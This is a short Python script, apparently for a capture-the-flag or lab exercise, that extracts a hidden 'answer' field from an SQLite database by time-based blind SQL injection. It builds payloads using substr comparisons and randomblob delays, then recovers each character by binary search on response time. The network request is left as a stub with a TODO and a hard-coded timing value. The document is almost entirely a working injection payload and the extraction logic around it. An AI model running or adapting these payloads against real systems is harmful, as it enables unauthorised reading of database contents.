def eq(c, pos):
    time_limit = 600
    request = "1' or (select substr(answer,"+str(pos)+",1) from answers limit 1)='"+c+"' and 1=randomblob(100000000);--"
    answer = 'xx'
    timing = 940
    
    if timing > time_limit:
        return True
    return False

def lt(c, pos):
    time_limit = 600
    request = "1' or (select substr(answer,"+str(pos)+",1) from answers limit 1)<'"+c+"' and 1=randomblob(100000000);--"
    answer = 'xx'
    timing = 940
        
    if timing > time_limit:
        return True
    return False

def gt(c, pos):
    time_limit = 600
    request = "1' or (select substr(answer,"+str(pos)+",1) from answers limit 1)>'"+c+"' and 1=randomblob(100000000);--"
    answer = 'xx'
    timing = 940
    
    if timing > time_limit:
        return True
    return False

def binsearch(pos):
    chars = list("-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz")
    #chars = list("0123456789")
    t = len(chars)
    b = 0
    i = t//2
    while True:
        if gt(chars[i],pos):
            print(chars[i], "is too small...")
            b = i
            i = (t+b)//2
        elif lt(chars[i],pos):
            print(chars[i], "is too large...")
            t = i
            i = (t+b)//2
        else:
            if eq(chars[i], pos):
                print(chars[i], "is correct!")
            else:
                print("error: terminating!")
            break
    return chars[i]

## TODO: Replace request, answer and timing with actual HTTP POST request, answer and timing

answer = ""
for i in range(14):
    answer += binsearch(i)

print(answer)
    
